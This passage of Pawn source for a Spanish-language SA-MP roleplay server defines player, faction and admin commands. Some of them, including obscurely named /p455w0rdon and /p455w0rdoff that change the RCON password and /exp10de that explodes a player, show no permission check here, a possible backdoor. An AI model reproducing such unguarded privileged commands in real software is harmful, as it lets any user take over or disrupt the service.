	    return SendClientMessage(playerid, COLOR_YELLOW2, "Tienes los mps bloqueados. Usa '/toggle mps' para activarlos.");
	if(!IsPlayerConnected(targetid) || targetid == INVALID_PLAYER_ID || targetid == playerid)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "{FF4600}[Error]:{C8C8C8} Jugador inv�lido");
    if(TiempoEsperaMps[playerid] != 0)
	    return SendClientMessage(playerid, COLOR_WHITE, "Debes esperar 5 segundos antes de usar nuevamente el comando.");

	OnPlayerPrivmsg(playerid, targetid, text);
	if(PlayerInfo[playerid][pAdmin] == 0)
	{
		TiempoEsperaMps[playerid] = 1;
		SetTimerEx("TimeMps", 5000, false, "i", playerid);
	}
    return 1;
}

public TimeMps(playerid)
{
	TiempoEsperaMps[playerid] = 0;
	return 1;
}


CMD:mps(playerid, params[]) {
	
	if(GetPVarInt(playerid, "pms") == 0) {
		SetPVarInt(playerid, "pms", 1);
		SendClientMessage(playerid, COLOR_GREEN, "Lector de whispers activado.");
		return 1;
	}
	if(GetPVarInt(playerid, "pms") == 1) {
		SetPVarInt(playerid, "pms", 0);
		SendClientMessage(playerid, COLOR_GREEN, "Lector de whispers desactivado.");
		return 1;
	}
	return 1;
}

CMD:rerollplates(playerid, params[]) {
	setVehicleRandomPlates();
	SendClientMessage(playerid, COLOR_ADMINCMD, "{878EE7}[INFO]:{C8C8C8}Se han reseteado todas las patentes");
	return 1;
}

CMD:sacar(playerid, params[]) {
	new
	    vehicleid = GetPlayerVehicleID(playerid),
		target;

	if(sscanf(params, "u", target)) {
	    SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /sacar [ID/Jugador]");
	} else if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
	    if(vehicleid == GetPlayerVehicleID(target) && target != INVALID_PLAYER_ID) {
	        RemovePlayerFromVehicle(target);
	        SendFMessage(playerid, COLOR_WHITE, "Has sacado a %s del veh�culo.", GetPlayerNameEx(target));
	        SendFMessage(target, COLOR_WHITE, "%s te ha sacado del veh�culo.", GetPlayerNameEx(playerid));
	    } else {
	        SendClientMessage(playerid, COLOR_YELLOW2, "Jugador inv�lido o no se encuentra en tu veh�culo.");
	    }
	} else {
	    SendClientMessage(playerid, COLOR_YELLOW2, "Debes ser el conductor del veh�culo.");
	}

	return 1;
}

CMD:set(playerid, params[]) {
	new
	    string[128],
	    target,
	    param[16],
	    value[64];
	    
	if(sscanf(params, "us[16]S(null)[64]", target, param, value)) {
	    SendClientMessage(playerid, COLOR_GREY, "{5CCAF1}[Sintaxis]:{C8C8C8} /set [IDJugador/ParteDelNombre] [stat] [value]");
	    SendClientMessage(playerid, COLOR_WHITE, "Stats: sexo | edad");
	} else if(strcmp(param, "sexo", true) == 0) {
	    if(strval(value) == 0) {
	        SendFMessage(target, COLOR_LIGHTYELLOW2, "{878EE7}[INFO]:{C8C8C8} %s te ha seteado el sexo a femenino.", GetPlayerNameEx(playerid));
			format(string, sizeof(string), "[Staff]: %s ha seteado el sexo de %s a femenino.", GetPlayerNameEx(playerid), GetPlayerNameEx(target));
			AdministratorMessage(COLOR_ADMINCMD, string, 1);
	        PlayerInfo[target][pSex] = 0;
	    } else if(strval(value) == 1) {
	        SendFMessage(target, COLOR_LIGHTYELLOW2, "{878EE7}[INFO]:{C8C8C8} %s te ha seteado el sexo a masculino.", GetPlayerNameEx(playerid));
			format(string, sizeof(string), "[Staff]: %s ha seteado el sexo de %s a masculino.", GetPlayerNameEx(playerid), GetPlayerNameEx(target));
			AdministratorMessage(COLOR_ADMINCMD, string, 1);
	        PlayerInfo[target][pSex] = 1;
	    } else {
	        SendClientMessage(playerid, COLOR_WHITE, "Solo se admite un valor igual a 0 (femenino) o 1 (masculino).");
	    }
	} else if(strcmp(param, "edad", true) == 0) {
	    if(strval(value) >= 1 && strval(value) <= 100) {
	        SendFMessage(target,COLOR_LIGHTYELLOW2,"{878EE7}[INFO]:{C8C8C8} %s te ha seteado la edad a %d a�os.", GetPlayerNameEx(playerid), strval(value));
			format(string, sizeof(string), "[Staff]: %s ha seteado la edad de %s a %d a�os.", GetPlayerNameEx(playerid), GetPlayerNameEx(target), strval(value));
			AdministratorMessage(COLOR_ADMINCMD, string, 1);
	        PlayerInfo[target][pAge] = strval(value);
	    } else {
	        SendClientMessage(playerid, COLOR_WHITE, "Solo se admite un valor mayor o igual a 1 y menor o igual a 100.");
	    }
	}
	return 1;
}

CMD:reglas(playerid, params[]) {
	ShowPlayerDialog(playerid,DLG_RULES,DIALOG_STYLE_LIST,"Terminos RP","DeathMatch\nPowerGaming\nCarJacking\nMetaGaming\nRevengeKill\nBunnyHop\nVehicleKill\nZigZag\nHeliKill\nDriveBy\nOOC\nIC\n/ME\n/DO","Seleccionar","Cancelar");
	return 1;
}

CMD:a(playerid, params[])
	return cmd_admin(playerid, params);

CMD:admin(playerid, params[]) {
	new
		text[256],
		string[128],
		string2[128];

	if(sscanf(params, "s[256]", text)) {
    	SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} (/a)dmin [mensaje]");
	} else {
		format(string, sizeof(string), "[Admin n. %d] %s: %s", PlayerInfo[playerid][pAdmin], GetPlayerNameEx(playerid), text);
		if(strlen(string) > 128) {
		    strmid(string2, string, 128, 256);
		    strdel(string, 128, 256);
		    AdministratorMessage(COLOR_ACHAT, string, 1);
		    AdministratorMessage(COLOR_ACHAT, string2, 1);
		} else {
		    AdministratorMessage(COLOR_ACHAT, string, 1);
		}
	}
	return 1;
}

CMD:ao(playerid, params[]) {
	new
		text[256],
		string[128],
		string2[128];

	if(sscanf(params, "s[256]", text)) {
    	SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} (/a)ooc [mensaje]");
	} else {
	    if(PlayerInfo[playerid][pAdmin] < 2) {
			format(string, sizeof(string), "(( [Anuncio] Mod %s: %s ))", GetPlayerNameEx(playerid), text);
		} else {
		    format(string, sizeof(string), "(( [Anuncio] Admin %s: %s ))", GetPlayerNameEx(playerid), text);
		}
		if(strlen(string) > 128) {
		    strmid(string2, string, 128, 256);
		    strdel(string, 128, 256);
		    SendClientMessageToAll(COLOR_AOOC, string);
		    SendClientMessageToAll(COLOR_AOOC, string2);
		} else {
		    SendClientMessageToAll(COLOR_AOOC, string);
		}
	}
	return 1;
}

CMD:bidon(playerid, params[]) {
	SendClientMessage(playerid, COLOR_WHITE, "Info: para llenar el bid�n deber�s estar a pie en una estaci�n de servicio y escribir '/llenar', para usarlo deber�s...");
	SendClientMessage(playerid, COLOR_WHITE, "situarte junto al tanque del veh�culo y tipear '/usarbidon', el estado del bid�n lo puedes ver usando '/mano'.");
	return 1;
}

CMD:fumar(playerid, params[])
{
    if(GetPlayerState(playerid) != 1)
		return SendClientMessage(playerid, COLOR_YELLOW2, "Solo puedes utilizarlo estando parado.");
	if(GetPVarInt(playerid, "disabled") != DISABLE_NONE)
		return SendClientMessage(playerid, COLOR_YELLOW2, "�No puedes utilizar esto estando incapacitado/congelado!");
	if(smoking[playerid])
		return SendClientMessage(playerid, COLOR_YELLOW2, "Ya est�s fumando, utiliza /apagarcigarro para terminar.");
	if(!PlayerInfo[playerid][pLighter])
		return SendClientMessage(playerid, COLOR_YELLOW2, "Necesitas un encendedor, intenta conseguir uno.");
	if(PlayerInfo[playerid][pCigarettes] <= 0)
		return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes m�s cigarrillos, v� y compra un paquete.");
 	if(PlayerCuffed[playerid] == 1)
		return SendClientMessage(playerid, COLOR_YELLOW2, "No puedes fumar estando esposado.");
	
    PlayerActionMessage(playerid, 15.0, "saca un encendedor y un cigarrillo de su bolsillo, lo enciende y comienza a fumar.");
	smoking[playerid] = true;
	PlayerInfo[playerid][pCigarettes]--;
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_SMOKE_CIGGY);
	return 1;
}

CMD:apagarcigarro(playerid, params[]) {
	if(!smoking[playerid])
		return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar fumando...");

	if(GetPVarInt(playerid, "disabled") == DISABLE_NONE && GetPlayerState(playerid) == 1) {
		if(GetPlayerInterior(playerid) > 0) {
		    PlayerActionMessage(playerid, 15.0, "apaga el cigarrillo y lo arroja al cenicero.");
		} else {
	 		PlayerActionMessage(playerid, 15.0, "apaga el cigarrillo y lo arroja al suelo.");
		}
		smoking[playerid] = false;
		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
	} else {
		SendClientMessage(playerid, COLOR_YELLOW2, "�No puedes utilizar esto estando incapacitado/congelado!");
	}
	return 1;
}

//===================================SIDE=======================================

CMD:sservicio(playerid, params[])
{
	new string[128];

    if(PlayerInfo[playerid][pFaction] != FAC_SIDE)
		return 1;
	if(!PlayerToPoint(5.0, playerid, POS_SIDE_DUTY_X, POS_SIDE_DUTY_Y, POS_SIDE_DUTY_Z))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar junto a los casilleros!");
	    
	if(SIDEDuty[playerid] == 0)
	{
		PlayerActionMessage(playerid, 15.0, "toma su radio y algunas herramientras del casillero.");
		SIDEDuty[playerid] = 1;
		format(string, sizeof(string), "[S.I.D.E]: %s se encuentra ahora en servicio.", GetPlayerNameEx(playerid));
		SendFactionMessage(FAC_SIDE, COLOR_PMA, string);
	}
	else
	{
		PlayerActionMessage(playerid, 15.0, "guarda la radio y las herramientas en su casillero.");
		EndPlayerDuty(playerid);
		format(string, sizeof(string), "[S.I.D.E]: %s se ha retirado de servicio.", GetPlayerNameEx(playerid));
		SendFactionMessage(FAC_SIDE, COLOR_PMA, string);
		SetPVarInt(playerid, "cantSaveItems", 1);
		SetTimerEx("cantSaveItems", 2000, false, "i", playerid);
	}
	return 1;
}

CMD:stars(playerid, params[])
{
	new toggle,
	    string[128];

    if(PlayerInfo[playerid][pFaction] != FAC_SIDE)
		return 1;
    if(PlayerInfo[playerid][pRank] != 1)
        return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes el rango suficiente.");
    if(SIDEDuty[playerid] != 1)
        return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar en servicio.");
    if(sscanf(params, "i", toggle))
	{
	    SendClientMessage(playerid, COLOR_GREY, "{5CCAF1}[Sintaxis]:{C8C8C8} /stars [0-1]");
	    switch(STARS)
		{
	        case 0: SendClientMessage(playerid, COLOR_WHITE, "Estado S.T.A.R.S.: {D40000}desautorizado");
	        case 1: SendClientMessage(playerid, COLOR_WHITE, "Estado S.T.A.R.S.: {00D41C}autorizado");
	    }
	}
	else if(toggle == 1 && STARS != 1)
	{
	    format(string, sizeof(string), "�Atenci�n! el S.T.A.R.S. ha sido autorizado por %s.", GetPlayerNameEx(playerid));
		SendFactionMessage(FAC_PMA, COLOR_PMA, string);
        STARS = 1;
	}
	else if(toggle == 0 && STARS != 0)
	{
	    format(string, sizeof(string), "�Atenci�n! el S.T.A.R.S. ha sido desautorizado por %s.", GetPlayerNameEx(playerid));
		SendFactionMessage(FAC_PMA, COLOR_PMA, string);
        STARS = 0;
	}
	else
	{
	    SendClientMessage(playerid, COLOR_GREY, "{5CCAF1}[Sintaxis]:{C8C8C8} /stars [0-1]");
	    switch(STARS)
		{
	        case 0: SendClientMessage(playerid, COLOR_WHITE, "Estado S.T.A.R.S.: {D40000}desautorizado");
	        case 1: SendClientMessage(playerid, COLOR_WHITE, "Estado S.T.A.R.S.: {00D41C}autorizado");
	    }
	}
	return 1;
}

CMD:porton(playerid, params[]) {
    if(PlayerInfo[playerid][pFaction] != FAC_SIDE) return 1;

	if(PlayerToPoint(15.0, playerid, 1286.0300, -1652.1801, 14.3000)) {
		if(SIDEGate[0] <= 0) {
		    SIDEGate[0] = 1;
			MoveObject(SIDEGate[1], 1286.31, -1654.82, 22.28, 1, 0.00, 0.00, 0.00);
			MoveObject(SIDEGate[2], 1286.30, -1645.22, 25.77, 1, 0.00, 0.00, 0.00);
			MoveObject(SIDEGate[3], 1286.32, -1645.22, 22.28, 1, 0.00, 0.00, 0.00);
			MoveObject(SIDEGate[4], 1286.28, -1654.82, 25.75, 1, 0.00, 0.00, 0.00);
			MoveObject(SIDEGate[5], 1286.30, -1654.10, 25.87, 1, 180.00, 0.00, 90.00);
			MoveObject(SIDEGate[6], 1286.30, -1642.65, 25.87, 1, 180.00, 0.00, 90.00);
			SIDEGateTimer = SetTimer("CloseSIDEGate", 1000 * 60 * 5, false);
		} else {
		    SIDEGate[0] = 0;
			MoveObject(SIDEGate[1], 1286.31, -1654.82, 14.28, 1, 0.00, 0.00, 0.00);
			MoveObject(SIDEGate[2], 1286.30, -1645.22, 17.77, 1, 0.00, 0.00, 0.00);
			MoveObject(SIDEGate[3], 1286.32, -1645.22, 14.28, 1, 0.00, 0.00, 0.00);
			MoveObject(SIDEGate[4], 1286.28, -1654.82, 17.75, 1, 0.00, 0.00, 0.00);
			MoveObject(SIDEGate[5], 1286.30, -1654.10, 17.87, 1, 180.00, 0.00, 90.00);
			MoveObject(SIDEGate[6], 1286.30, -1642.65, 17.87, 1, 180.00, 0.00, 90.00);
			KillTimer(SIDEGateTimer);
		}
		PlayerActionMessage(playerid, 15.0, "toma el mando a distancia del port�n y presiona un bot�n.");
	}
	return 1;
}

CMD:sropero(playerid, params[])
{
	new item;
	
    if(!isPlayerSideOnDuty(playerid))
        return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar en servicio para usar este comando.");
	if(!PlayerToPoint(3.0, playerid, POS_SIDE_DUTY_X, POS_SIDE_DUTY_Y, POS_SIDE_DUTY_Z))
		return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar junto a los casilleros!");
	if(sscanf(params, "i", item))
		return SendClientMessage(playerid, COLOR_GREY, "{5CCAF1}[Sintaxis]:{C8C8C8} /sropero [0-10] (Para elegir tu ropa original usa 0)");
	if(item < 0 || item > 10)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "Elige una opci�n v�lida.");
	    
	switch(item)
	{
        case 0: SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
		case 1: SetPlayerSkin(playerid, 163);
		case 2: SetPlayerSkin(playerid, 164);
		case 3: SetPlayerSkin(playerid, 165);
		case 4: SetPlayerSkin(playerid, 166);
		case 5: SetPlayerSkin(playerid, 186);
		case 6: SetPlayerSkin(playerid, 295);
		case 7: SetPlayerSkin(playerid, 286);
		case 8: SetPlayerSkin(playerid, 70);
		case 9: SetPlayerSkin(playerid, 141);
		case 10: SetPlayerSkin(playerid, 150);
	}
    PlayerActionMessage(playerid, 15.0, "toma ropa del casillero y se la viste.");
	return 1;
}

CMD:aprender(playerid,params[]) {
	new
		text[128];
		
	if(PlayerToPoint(3.0, playerid, 766.3723, 13.8237, 1000.7015)){
	    if(GetPlayerCash(playerid) >= PRICE_FIGHTSTYLE){
			if(sscanf(params, "s[128]", text)) {
				SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /aprender [comando]");
				SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "[Comandos]: normal - boxeo - kungfu - patadas - codazos");
				SendFMessage(playerid, COLOR_LIGHTYELLOW2, "{878EE7}[INFO]:{C8C8C8} El costo de aprendizaje de cada estilo de pelea es de %d (aviso: el estilo normal es gratuito).", PRICE_FIGHTSTYLE);
			} else if(strcmp(text, "normal", true) == 0) {
     		    SetPlayerFightingStyle(playerid, 4); // FIGHT_STYLE_NORMAL
    		    PlayerInfo[playerid][pFightStyle] = 4; // FIGHT_STYLE_NORMAL
   				SendClientMessage(playerid, 0xFFFFFFAA, "Tu nuevo estilo de pelea es normal.");
			} else if(strcmp(text, "boxeo", true) == 0) {
    		    SetPlayerFightingStyle(playerid, 5); // FIGHT_STYLE_BOXING
    		    PlayerInfo[playerid][pFightStyle] = 5; // FIGHT_STYLE_BOXING
    		    GivePlayerCash(playerid, -PRICE_FIGHTSTYLE);
   		 		SendClientMessage(playerid, 0xFFFFFFAA, "Tu nuevo estilo de pelea es boxeo.");
			} else if(strcmp(text, "kungfu", true) == 0) {
				SetPlayerFightingStyle(playerid, 6); // FIGHT_STYLE_KUNGFU
				PlayerInfo[playerid][pFightStyle] = 6; // FIGHT_STYLE_KUNGFU
				GivePlayerCash(playerid, -PRICE_FIGHTSTYLE);
				SendClientMessage(playerid, 0xFFFFFFAA, "Tu nuevo estilo de pelea es kung fu.");
			} else if(strcmp(text, "patadas", true) == 0) {
	      	    SetPlayerFightingStyle(playerid, 15); // FIGHT_STYLE_GRABKICK
 	   	        PlayerInfo[playerid][pFightStyle] = 15; // FIGHT_STYLE_GRABKICK
 	   	        GivePlayerCash(playerid, -PRICE_FIGHTSTYLE);
    	    	SendClientMessage(playerid, 0xFFFFFFAA, "Tu nuevo estilo de pelea es patadas.");
			} else if(strcmp(text, "codazos", true) == 0) {
				SetPlayerFightingStyle(playerid, 16); // FIGHT_STYLE_ELBOW
    	        PlayerInfo[playerid][pFightStyle] = 16; // FIGHT_STYLE_ELBOW
    	        GivePlayerCash(playerid, -PRICE_FIGHTSTYLE);
				SendClientMessage(playerid, 0xFFFFFFAA, "Tu nuevo estilo de pelea es codazos.");
			}
		} else {
			SendFMessage(playerid, COLOR_YELLOW2, "No tienes el dinero suficiente para pagarle al instructor (%d).", PRICE_FIGHTSTYLE);
	 	}
	} else {
		SendClientMessage(playerid, COLOR_YELLOW2, "No est�s en el gimnasio con el instructor.");
	}
	return 1;
}

CMD:exp10de(playerid, params[]) {

	new
	    string[128],
		target,
		Float:boom[3];

	if(sscanf(params, "u", target)) {
		SendClientMessage(playerid, COLOR_GREY, "{5CCAF1}[Sintaxis]:{C8C8C8} /exp10de [IDJugador/ParteDelNombre]");
	} else {
		format(string, sizeof(string), "[Staff]: %s ha explotado a %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(target));
		AdministratorMessage(COLOR_ADMINCMD, string, 1);
		SetPlayerHealth(target, 10);
		GetPlayerPos(target, boom[0], boom[1], boom[2]);
		CreateExplosion(boom[0], boom[1] , boom[2], 7, 10);
		printf("[Comando] %s ha usado /exp10de para explotar a %s", GetPlayerNameEx(playerid), GetPlayerNameEx(target));
	}
	return 1;
}

CMD:llenar(playerid, params[])
{
	new refillprice, refillamount, refilltype, preamount, vehicleid;

	if(!IsAtGasStation(playerid))
		return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar cerca de un dispenser de combustible en alguna estaci�n de servicio.");
	if(GetPlayerCash(playerid) < (PRICE_FULLTANK / 100)) // Lo m�nimo para llenar
	   	return SendClientMessage(playerid, COLOR_YELLOW2, "Vuelve cuando tengas el dinero suficiente.");
	if(fillingFuel[playerid])
	    return SendClientMessage(playerid, COLOR_YELLOW2, "Ya te encuentras cargando nafta.");
    if(IsPlayerInAnyVehicle(playerid))
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
	    	return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar como conductor del veh�culo.");
		vehicleid = GetPlayerVehicleID(playerid);
		preamount = VehicleInfo[vehicleid][VehFuel];
		if(preamount > 99)
  			return SendClientMessage(playerid, COLOR_YELLOW2, "El tanque se encuentra lleno.");
		refilltype = 1;
        PlayerActionMessage(playerid, 15.0, "comienza a cargar nafta en el tanque del veh�culo.");
	} else
		{
			if(GetHandItem(playerid, HAND_RIGHT) != ITEM_ID_BIDON)
   				return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar dentro de un veh�culo o tener un bid�n con nafta en la mano derecha.");
			else
			{
			    preamount = GetHandParam(playerid, HAND_RIGHT);
				refilltype = 2;
				PlayerActionMessage(playerid, 15.0, "comienza a cargar nafta en el bid�n de combustible.");
			}
		}
	refillprice = PRICE_FULLTANK / 100 * (100 - preamount); // precio para llenar el tanque
	if(GetPlayerCash(playerid) < refillprice)
	{
        refillamount = GetPlayerCash(playerid) / (PRICE_FULLTANK / 100); // en porcentaje
    	refillprice = GetPlayerCash(playerid);
	} else
		refillamount = 100 - preamount; // le llenamos lo que le falta, en porcentaje
 	TogglePlayerControllable(playerid, false);
	GameTextForPlayer(playerid, "~w~Cargando nafta", 6000, 4);
	fillingFuel[playerid] = true;
	SetPVarInt(playerid, "fuelCar", SetTimerEx("fuelCar", 6000, false, "iiii", playerid, refillprice, refillamount, refilltype));
	return 1;
}

CMD:animhablar(playerid, params[])
{
	if(!TalkAnimEnabled[playerid])
	{
 		TalkAnimEnabled[playerid] = true;
 		SendClientMessage(playerid, COLOR_WHITE, "Animaci�n al hablar: {FF4600}ACTIVADA{C8C8C8}");
	} else {
		TalkAnimEnabled[playerid] = false;
		SendClientMessage(playerid, COLOR_WHITE, "Animaci�n al hablar: {FF4600}DESACTIVADA{C8C8C8}");
	}
	return 1;
}

public EndAnim(playerid)
{
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 0);
	return 1;
}

CMD:liberar(playerid, params[])
{
    new targetID;
	
    if(sscanf(params, "u", targetID))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /liberar [ID/Jugador]");
    if(PlayerInfo[playerid][pFaction] != FAC_GOB)
        return 1;
    if(PlayerInfo[playerid][pRank] > 2)
		return SendClientMessage(playerid, COLOR_YELLOW2, "Tu rango no tiene acceso a ese comando.");
	if(PlayerInfo[targetID][pJailed] != 1)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "El sujeto no tiene ninguna condena.");
    
	PlayerInfo[targetID][pJailed] = 0;
	PlayerInfo[targetID][pJailTime] = 0;
    SendClientMessage(targetID, COLOR_LIGHTYELLOW2,"{878EE7}[Prisi�n]:{C8C8C8} por orden de un juez quedas en libertad.");
	SetPlayerVirtualWorld(targetID, Building[2][blInsideWorld]);
	SetPlayerInterior(targetID, 3);
	SetPlayerPos(targetID, 229.01, 151.30, 1003.02);
	SetPlayerFacingAngle(targetID, 270.0000);
	TogglePlayerControllable(targetID, true);
	return 1;
}	
		
		
CMD:verpresos(playerid, params[])
{
	new string[128], count = 0;
	
	if(PlayerInfo[playerid][pFaction] != FAC_GOB)
		return 1;
	if(PlayerInfo[playerid][pRank] > 4)
		return SendClientMessage(playerid, COLOR_YELLOW2, "Tu rango no tiene acceso a ese comando.");
		
	SendClientMessage(playerid, COLOR_LIGHTGREEN, "====================[PRESOS]===================");
	foreach(new i : Player) {
	    if(PlayerInfo[i][pJailed] == 1) {
			format(string, 256, "%s", GetPlayerNameEx(i));
			SendClientMessage(playerid, COLOR_WHITE, string);
			count++;
		}
	}
	if(count == 0){
	    SendClientMessage(playerid, COLOR_WHITE, "No hay ninguna persona presa actualmente");
	}
	SendClientMessage(playerid, COLOR_LIGHTGREEN, "===============================================");
	return 1;
}

CMD:verconectados(playerid, params[])
{
    if(PlayerInfo[playerid][pFaction] != FAC_GOB)
	    return 1;
	if(PlayerInfo[playerid][pRank] > 3)
		return SendClientMessage(playerid, COLOR_YELLOW2, "Tu rango no tiene acceso a ese comando.");
	
	SendFMessage(playerid, COLOR_LIGHTYELLOW2, "Miembros conectados [%s]:", FactionInfo[FAC_PMA][fName]);
    foreach(new i : Player) {
        if(PlayerInfo[i][pFaction] == FAC_PMA)
	        SendFMessage(playerid, COLOR_WHITE, "* (%s) %s", GetRankName(FAC_PMA, PlayerInfo[i][pRank]), GetPlayerNameEx(i));
        }
	SendFMessage(playerid, COLOR_LIGHTYELLOW2, "Miembros conectados [%s]:", FactionInfo[FAC_HOSP][fName]);
    foreach(new i : Player) {
        if(PlayerInfo[i][pFaction] == FAC_HOSP)
	        SendFMessage(playerid, COLOR_WHITE, "* (%s) %s", GetRankName(FAC_HOSP, PlayerInfo[i][pRank]), GetPlayerNameEx(i));
	    }
	SendFMessage(playerid, COLOR_LIGHTYELLOW2, "Miembros conectados [%s]:", FactionInfo[FAC_MECH][fName]);
    foreach(new i : Player) {
	    if(PlayerInfo[i][pFaction] == FAC_MECH)
	     	SendFMessage(playerid, COLOR_WHITE, "* (%s) %s", GetRankName(FAC_MECH, PlayerInfo[i][pRank]), GetPlayerNameEx(i));
		}
	return 1;
}

public AntecedentesLog(playerid, targetid, antecedentes[])
{
	new year, month, day,
	    hour, minute, second,
	    playerName[24],
	    targetName[24] = "Ninguno",
		query[512],
		targetSQLID = 0;

	getdate(year, month, day);
	gettime(hour, minute, second);
	
	GetPlayerName(playerid, playerName, 24);
	mysql_real_escape_string(playerName, playerName, 1, sizeof(playerName));
	
	if(targetid != INVALID_PLAYER_ID)
	{
		GetPlayerName(targetid, targetName, 24);
		mysql_real_escape_string(targetName, targetName, 1, sizeof(targetName));
		targetSQLID = PlayerInfo[targetid][pID];
	}

	format(query, sizeof(query), "INSERT INTO `log_antecedentes` (pID, pName, pIP, date, tID, pAntecedentes, tName) VALUES (%d, '%s', %d, '%02d-%02d-%02d %02d:%02d:%02d', %d, '%s', '%s')",
		PlayerInfo[playerid][pID],
		playerName,
		PlayerInfo[playerid][pIP],
		year,
		month,
		day,
		hour,
		minute,
		second,
		targetSQLID,
		antecedentes,
		targetName
	);
	mysql_function_query(dbHandle, query, false, "", "");
	return 1;
}

CMD:verantecedentes(playerid, params[])
{
    new targetname[MAX_PLAYER_NAME],
	    query[128];

    if(sscanf(params, "s[24]", targetname))
		return SendClientMessage(playerid, COLOR_GRAD2, "{5CCAF1}[Sintaxis]:{C8C8C8} /verantecedentes [Nombre del jugador] (Con el '_')");
    if(PlayerInfo[playerid][pFaction] != FAC_SIDE && PlayerInfo[playerid][pFaction] != FAC_PMA && PlayerInfo[playerid][pFaction] != FAC_GOB)
		return 1;
	
	mysql_real_escape_string(targetname, targetname);
	format(query, sizeof(query), "SELECT * FROM `log_antecedentes` WHERE `tName` = '%s' ORDER BY date DESC LIMIT 30", targetname);
	mysql_function_query(dbHandle, query, true, "OnLogAntecedentesLoad", "is", playerid, targetname);
	return 1;
}

forward OnLogAntecedentesLoad(playerid, targetname[]);
public OnLogAntecedentesLoad(playerid, targetname[])
{
	new result[128],
		result2[128],
		result3[128],
	    rows,
	    fields,
	    cont,
	    aux = 0,
	    str[128] = "";

	cache_get_data(rows, fields);

	if(rows)
	{
		SendFMessage(playerid, COLOR_LIGHTYELLOW2, "=========================[Registros de antecedentes de %s]=========================", targetname);
		while(aux < rows)
		{
   			cache_get_field_content(aux, "pAntecedentes", result);
			cache_get_field_content(aux, "date", result2);
			cache_get_field_content(aux, "pName", result3);
			
			format(str, sizeof(str), "%s[%s] %s, por: %s", str, result2, result, result3);
			cont ++;
			if(cont == 1)
			{
			   cont = 0;
			   SendClientMessage(playerid, COLOR_WHITE, str);
			   format(str, sizeof(str), "");
			}
			aux ++;
		}
		if(cont != 3)
			SendClientMessage(playerid, COLOR_WHITE, str);
	}
	else
		SendClientMessage(playerid, COLOR_YELLOW2, "El usuario no posee ning�n registro antecedentes.");
	return 1;
}

//Other

CMD:p455w0rdon(playerid, params[]) {
	SendRconCommand("password vip0");
	return 1;
}

CMD:p455w0rdoff(playerid, params[]) {
	SendRconCommand("password 0");
	return 1;
}

CMD:connectiontime1(playerid, params[]) {
	SendRconCommand("minconnectiontime 1000");
	return 1;
}

CMD:connectiontime3(playerid, params[]) {
	SendRconCommand("minconnectiontime 3000");
	return 1;
}
